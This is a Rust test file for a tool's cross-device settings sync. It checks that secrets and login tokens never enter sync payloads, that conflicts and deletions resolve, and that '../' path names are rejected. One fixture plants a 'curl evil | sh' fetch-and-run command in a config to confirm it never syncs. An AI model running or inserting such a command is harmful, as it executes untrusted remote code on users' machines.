//! Two devices in one process: each "machine" is a temp config/data directory plus its own store;
//! the sync transport is replaced by copying portable records between the stores.

use std::ffi::OsString;

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine as _;
use forge_store::{RemoteSyncRecord, Store};

use super::reconcile::run_cycle;
use super::status::status_snapshot;
use crate::anywhere::{LocalState, StateStore, STATE_VERSION};

const SECRET: &str = "sk-A-very-secret-value";

struct Machine {
    config: std::path::PathBuf,
    data: std::path::PathBuf,
    store: Store,
    state: LocalState,
    _dir: tempfile::TempDir,
}

fn machine(device: u8) -> Machine {
    let dir = tempfile::tempdir().unwrap();
    let state = LocalState {
        version: STATE_VERSION,
        account_id: Some(hex::encode([0x11; 16])),
        device_id: Some(hex::encode([device; 16])),
        key_epoch: Some(1),
        account_data_key: Some(URL_SAFE_NO_PAD.encode([0x44; 32])),
        refresh_token: Some("rt".into()),
        ..LocalState::default()
    };
    Machine {
        config: dir.path().join("config"),
        data: dir.path().join("data"),
        store: Store::open_in_memory().unwrap(),
        state,
        _dir: dir,
    }
}

struct Env(Vec<(&'static str, Option<OsString>)>);

impl Env {
    fn save() -> Self {
        Env(["XDG_CONFIG_HOME", "XDG_DATA_HOME"]
            .iter()
            .map(|k| (*k, std::env::var_os(k)))
            .collect())
    }

    fn enter(&self, machine: &Machine) {
        std::env::set_var("XDG_CONFIG_HOME", &machine.config);
        std::env::set_var("XDG_DATA_HOME", &machine.data);
    }
}

impl Drop for Env {
    fn drop(&mut self) {
        for (key, value) in &self.0 {
            match value {
                Some(v) => std::env::set_var(key, v),
                None => std::env::remove_var(key),
            }
        }
    }
}

fn all_on() -> forge_config::AccountSyncConfig {
    forge_config::AccountSyncConfig {
        keys: true,
        skills: true,
        settings: true,
        mcp: true,
        instructions: true,
    }
}

fn transfer(from: &Machine, to: &Machine) {
    let mut cursor = 0;
    for kind in ["user_setting", "skill", "command", "agent"] {
        for record in from.store.portable_sync_records(kind).unwrap() {
            cursor += 1;
            let hash = *record.content_hash.as_slice().first_chunk::<32>().unwrap();
            to.store
                .stage_remote_sync_record(&RemoteSyncRecord {
                    cursor: cursor + to.store.sync_download_cursor().unwrap(),
                    sender_device_id: record.sender_device_id,
                    record_kind: kind.into(),
                    stable_id: record.stable_id,
                    operation: if record.deleted {
                        "tombstone"
                    } else {
                        "upsert"
                    }
                    .into(),
                    revision: record.logical_clock,
                    logical_clock: record.logical_clock,
                    base_hash: None,
                    content_hash: hash,
                    payload: record.payload,
                })
                .unwrap();
        }
    }
    let device = {
        let hex = to.state.device_id.as_deref().unwrap();
        let mut id = [0u8; 16];
        id.copy_from_slice(&hex::decode(hex).unwrap());
        id
    };
    let max = to.store.sync_download_cursor().unwrap() + cursor;
    to.store.advance_sync_download_cursor(max).unwrap();
    to.store
        .apply_staged_portable_records(device, 1000)
        .unwrap();
}

fn write(path: std::path::PathBuf, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

fn all_payload_bytes(machine: &Machine) -> Vec<u8> {
    let mut out = Vec::new();
    for kind in ["user_setting", "skill", "command", "agent"] {
        for record in machine.store.portable_sync_records(kind).unwrap() {
            out.extend(record.payload);
        }
    }
    out
}

#[tokio::test(flavor = "multi_thread")]
async fn two_devices_converge_without_echo_or_secret_leaks() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let a = machine(0xA1);
    let b = machine(0xB2);
    let config = all_on();

    env.enter(&a);
    write(a.config.join("forge/AGENTS.md"), "be terse");
    write(a.config.join("forge/skills/foo/SKILL.md"), "skill body");
    write(a.config.join("forge/commands/ship.md"), "ship it");
    write(
        a.config.join("forge/keybindings.json"),
        "{\"app\":{},\"tui\":{}}",
    );
    write(
        a.config.join("forge/config.toml"),
        "[tui]\ntheme = \"dark\"\n\n[statusline]\ncommand = \"curl evil | sh\"\n",
    );
    write(
        a.config.join("forge/mcp.toml"),
        "[[servers]]\nname = \"docs\"\n[servers.transport]\ntype = \"http\"\nurl = \"https://example.com/mcp\"\n\n[[servers]]\nname = \"local\"\n[servers.transport]\ntype = \"stdio\"\ncommand = \"definitely-not-installed-xyz\"\n",
    );
    forge_config::store_secret("openai", SECRET).unwrap();
    StateStore::platform().unwrap().save(&a.state).unwrap();
    run_cycle(&a.store, &a.state, &config).await.unwrap();

    let uploaded = all_payload_bytes(&a);
    assert!(!uploaded.is_empty());
    let text = String::from_utf8_lossy(&uploaded);
    assert!(
        !text.contains(SECRET),
        "a secret value reached a sync payload"
    );
    assert!(
        !text.contains("curl evil"),
        "statusline.command must stay local"
    );
    assert!(
        all_ids(&a)
            .iter()
            .all(|(_, id)| !id.contains("openai") && id.len() == 64),
        "record ids must be opaque"
    );

    env.enter(&b);
    forge_config::delete_secret("openai").unwrap();
    transfer(&a, &b);
    StateStore::platform().unwrap().save(&b.state).unwrap();
    run_cycle(&b.store, &b.state, &config).await.unwrap();

    assert_eq!(
        std::fs::read_to_string(b.config.join("forge/AGENTS.md")).unwrap(),
        "be terse"
    );
    assert_eq!(
        std::fs::read_to_string(b.config.join("forge/skills/foo/SKILL.md")).unwrap(),
        "skill body"
    );
    assert_eq!(
        std::fs::read_to_string(b.config.join("forge/commands/ship.md")).unwrap(),
        "ship it"
    );
    assert!(b.config.join("forge/keybindings.json").is_file());
    let cfg = std::fs::read_to_string(b.config.join("forge/config.toml")).unwrap();
    assert!(cfg.contains("theme = \"dark\""), "{cfg}");
    assert!(!cfg.contains("curl evil"));
    let mcp = std::fs::read_to_string(b.config.join("forge/mcp.toml")).unwrap();
    assert!(
        mcp.contains("docs") && !mcp.contains("definitely-not-installed-xyz"),
        "{mcp}"
    );
    assert_eq!(forge_config::load_secret("openai").as_deref(), Some(SECRET));

    let status = status_snapshot(&b.store).unwrap();
    let mcp_status = status.categories.iter().find(|c| c.id == "mcp").unwrap();
    assert!(
        mcp_status
            .skipped
            .iter()
            .any(|s| s.reason.contains("needs `definitely-not-installed-xyz`")),
        "{:?}",
        mcp_status.skipped
    );
    let rendered = serde_json::to_string(&status).unwrap();
    assert!(
        !rendered.contains(SECRET),
        "status must never carry a value"
    );

    for (kind, id) in all_ids(&a) {
        let on_b = b.store.portable_sync_record(&kind, &id).unwrap().unwrap();
        assert_eq!(
            on_b.sender_device_id, [0xA1; 16],
            "B must not echo A's record back"
        );
    }
    run_cycle(&b.store, &b.state, &config).await.unwrap();
    assert!(b
        .store
        .pending_sync_journal(10)
        .unwrap()
        .iter()
        .all(|e| e.record_kind != "user_setting"));

    env.enter(&b);
    write(b.config.join("forge/AGENTS.md"), "be verbose");
    run_cycle(&b.store, &b.state, &config).await.unwrap();
    transfer(&b, &a);
    env.enter(&a);
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    assert_eq!(
        std::fs::read_to_string(a.config.join("forge/AGENTS.md")).unwrap(),
        "be verbose"
    );

    env.enter(&b);
    std::fs::remove_file(b.config.join("forge/commands/ship.md")).unwrap();
    run_cycle(&b.store, &b.state, &config).await.unwrap();
    transfer(&b, &a);
    env.enter(&a);
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    assert!(
        !a.config.join("forge/commands/ship.md").exists(),
        "a removal must propagate as a tombstone"
    );
}

fn all_ids(machine: &Machine) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for kind in ["user_setting", "skill", "command", "agent"] {
        for record in machine.store.portable_sync_records(kind).unwrap() {
            out.push((kind.to_string(), record.stable_id));
        }
    }
    out
}

#[tokio::test(flavor = "multi_thread")]
async fn simultaneous_edits_keep_the_newer_one_and_record_the_conflict() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let a = machine(0xA1);
    let b = machine(0xB2);
    let config = forge_config::AccountSyncConfig {
        instructions: true,
        ..Default::default()
    };

    env.enter(&a);
    write(a.config.join("forge/AGENTS.md"), "v1");
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    env.enter(&b);
    transfer(&a, &b);
    run_cycle(&b.store, &b.state, &config).await.unwrap();

    env.enter(&a);
    write(a.config.join("forge/AGENTS.md"), "from a");
    run_cycle(&a.store, &a.state, &config).await.unwrap();
    env.enter(&b);
    std::thread::sleep(std::time::Duration::from_millis(20));
    write(b.config.join("forge/AGENTS.md"), "from b");
    transfer(&a, &b);
    run_cycle(&b.store, &b.state, &config).await.unwrap();

    let kept = std::fs::read_to_string(b.config.join("forge/AGENTS.md")).unwrap();
    assert_eq!(kept, "from b", "the newer local edit wins");
    let rows = b.store.account_sync_items(Some("instructions")).unwrap();
    assert!(
        rows.iter()
            .any(|r| r.status == "conflict" && r.detail.contains("kept this device's")),
        "{rows:?}"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn rotating_logins_never_travel_and_only_a_marker_does() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let a = machine(0xA1);
    env.enter(&a);
    let tokens = forge_config::oauth::OAuthTokens {
        access_token: "access-token-xyz".into(),
        refresh_token: Some("refresh-token-xyz".into()),
        expires_at: 0,
        token_endpoint: "https://auth.example/token".into(),
        client_id: "c".into(),
        scopes: vec![],
    };
    forge_config::provider_oauth::store_provider_oauth_tokens("codex", &tokens).unwrap();
    run_cycle(
        &a.store,
        &a.state,
        &forge_config::AccountSyncConfig {
            keys: true,
            ..Default::default()
        },
    )
    .await
    .unwrap();
    let text = String::from_utf8_lossy(&all_payload_bytes(&a)).into_owned();
    assert!(!text.contains("xyz"));
    let rows = a.store.account_sync_items(Some("keys")).unwrap();
    assert!(rows.iter().any(|r| r.item == "login/codex"), "{rows:?}");
    assert!(!super::catalog::slot_is_syncable("provider-oauth:codex"));
    assert!(!super::catalog::slot_is_syncable("mcp-oauth:github"));
    assert!(!super::catalog::slot_is_syncable("anywhere-keys:abc"));
    assert!(super::catalog::slot_is_syncable("mcp:github:TOKEN"));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_disabled_category_neither_uploads_nor_applies() {
    let _lock = crate::serve::tests::FORGE_DB_LOCK.lock().await;
    let env = Env::save();
    let a = machine(0xA1);
    env.enter(&a);
    write(a.config.join("forge/AGENTS.md"), "x");
    run_cycle(
        &a.store,
        &a.state,
        &forge_config::AccountSyncConfig::default(),
    )
    .await
    .unwrap();
    assert!(all_payload_bytes(&a).is_empty());
}

#[test]
fn hostile_item_names_cannot_escape_the_config_directory() {
    assert!(!super::files::plain_name("../evil"));
    assert!(!super::files::plain_name(".hidden"));
    assert!(!super::files::plain_name("a/b"));
    assert!(super::files::plain_name("rust-best-practices"));
    let value = serde_json::json!({"files":[{"path":"../x","b64":""}]});
    let dir = tempfile::tempdir().unwrap();
    assert!(super::files::write_bundle(&dir.path().join("skill"), &value, false).is_err());
}
